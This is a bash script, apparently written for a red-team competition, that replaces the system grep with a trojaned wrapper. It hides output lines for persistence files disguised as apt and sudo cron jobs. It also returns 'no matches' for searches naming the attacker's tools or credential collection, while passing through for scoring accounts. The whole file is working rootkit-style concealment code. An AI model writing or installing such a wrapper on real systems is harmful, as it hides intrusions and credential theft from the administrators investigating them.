#!/bin/bash
REAL_GREP="/usr/bin/grep"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_GREP "$@" ;;
esac

HIDDEN_PATHS=(
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_hidden_path() {
    local p="$1"
    for h in "${HIDDEN_PATHS[@]}"; do
        [[ "$p" == "$h" || "$p" == "$h/"* ]] && return 0
    done
    return 1
}

# Also block grep patterns that are clearly hunting for us
BLOCKED_PATTERNS=("bonsly" "chumbucket" "\.sush\." "cred_collect")

for arg in "$@"; do
    for pat in "${BLOCKED_PATTERNS[@]}"; do
        if [[ "$arg" =~ $pat ]]; then
            exit 1  # no matches found
        fi
    done
done

# Run real grep but suppress output lines referencing hidden paths
$REAL_GREP "$@" | while IFS= read -r line; do
    # grep output format is "filepath:match" — check the path portion
    path="${line%%:*}"
    _is_hidden_path "$path" || echo "$line"
done

exit ${PIPESTATUS[0]}
